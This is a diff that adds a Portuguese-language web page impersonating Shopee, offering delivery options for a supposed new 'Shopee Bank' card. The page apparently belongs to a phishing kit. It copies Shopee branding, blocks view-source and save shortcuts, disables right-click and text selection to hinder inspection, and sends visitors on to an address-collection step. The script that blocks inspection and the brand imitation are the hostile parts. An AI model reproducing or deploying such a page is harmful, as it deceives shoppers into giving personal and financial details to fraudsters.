@@ -1,0 +1,208 @@
+<!DOCTYPE html><html lang="pt-BR">
+<head>
+     <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PZGDSCMH');</script>
+<!-- End Google Tag Manager -->
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/assets/icon_favicon_1_32.0Wecxv.png">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <title>Método de Entrega</title>
+    <style>
+        .header {
+            background: white;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .main-content {
+            max-width: 600px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 20px auto;
+        }
+
+        .delivery-option {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .option-card {
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .option-card img {
+            max-width: 40px;
+            margin-bottom: 10px;
+        }
+
+        .btn-custom {
+            background-color: #ee4d2d;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 8px;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .btn-custom:hover {
+            background-color: #000;
+        }
+
+        .agency-section {
+            margin-top: 30px;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+    }
+
+        .footer p {
+            margin: 0;
+        }
+    </style>
+<script>
+if (document.addEventListener) {
+    document.addEventListener("keydown", bloquearSource);
+} else { //Versões antigas do IE
+    document.attachEvent("onkeydown", bloquearSource);
+}
+
+function bloquearSource(e) {
+    e = e || window.event;
+
+    var code = e.which || e.keyCode;
+
+    if (
+        e.ctrlKey &&
+        (code == 83 || code == 85) //83 = S, 85 = U
+    ) {
+        if (e.preventDefault) {
+            e.preventDefault();
+        } else {
+            e.returnValue = false;
+        }
+
+        return false;
+    }
+}
+</script><style>
+/*desabilita a seleção no body*/
+body {
+    -webkit-touch-callout: none; /* iOS Safari */
+      -webkit-user-select: none; /* Chrome/Safari/Opera */
+       -khtml-user-select: none; /* Konqueror */
+         -moz-user-select: none; /* Firefox */
+          -ms-user-select: none; /* Internet Explorer/Edge */
+              user-select: none;
+}
+
+/*habilita a seleção nos campos editaveis*/
+input, textarea {
+    -webkit-touch-callout: initial; /* iOS Safari */
+      -webkit-user-select: text; /* Chrome/Safari/Opera */
+       -khtml-user-select: text; /* Konqueror */
+         -moz-user-select: text; /* Firefox */
+          -ms-user-select: text; /* Internet Explorer/Edge */
+              user-select: text;
+}
+
+/*habilita a seleção nos campos com o atributo contenteditable*/
+[contenteditable=true] {
+    -webkit-touch-callout: initial; /* iOS Safari */
+      -webkit-user-select: all; /* Chrome/Safari/Opera */
+       -khtml-user-select: all; /* Konqueror */
+         -moz-user-select: all; /* Firefox */
+          -ms-user-select: all; /* Internet Explorer/Edge */
+              user-select: all;
+}
+</style><script>
+if (document.addEventListener) {
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+        return false;
+    });
+} else { //Versões antigas do IE
+    document.attachEvent("oncontextmenu", function(e) {
+        e = e || window.event;
+        e.returnValue = false;
+        return false;
+    });
+}
+</script>
+</head>
+
+<div class="header">
+    <img src="images/shopee-logo.png" alt="YES Card Logo" style="width: 120px;">
+</div>
+
+<div class="main-content">
+    <h3>Método de Entrega</h3>
+    <p>Escolha como você deseja receber seu novo cartão</p>
+
+    <!-- Opção de entrega -->
+    <div class="delivery-option">
+        <div class="option-card" id="correios-option">
+            <img src="images/45880.png" alt="Ícone de caminhão">
+            <h5>Entrega pelos Correios</h5>
+            <p>Receba seu cartão no conforto da sua casa em até 1 dia útil</p>
+            <button class="btn-custom" onclick="escolherEntrega()">Prefiro receber pelos Correios</button>
+        </div>
+
+        <div class="option-card" id="agencia-option">
+            <img src="images/2825777.png" alt="Ícone de agência">
+            <h5>Retirada em Agência</h5>
+            <p>Retire seu cartão em uma de nossas agências Shopee</p>
+        </div>
+    </div>
+
+    <!-- Nova seção: Nossas Agências -->
+    <div class="agency-section">
+        <h4>Nossas Agências Shopee Bank</h4>
+        <p>Agência Central</p>
+        <p>Avenida Paulista, 1230<br>
+        Conj 612 a 1510 Lado Par<br>
+        Bela Vista, Sao Paulo - SP<br>
+01.310-100</p>
+        <img src="images/3722049.png" alt="Ícone de localização" style="max-width: 50px;">
+    </div>
+</div>
+
+    <!-- Footer -->
+    <div class="footer">
+Copyright 2025 Shopee. Todos os direitos reservados.<br>
+
+Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+<script>
+    function escolherEntrega() {
+        const destino = '../cep/index.html'; // Substitua com a URL desejada.
+        window.location.href = destino;
+    }
+</script>
+</html>
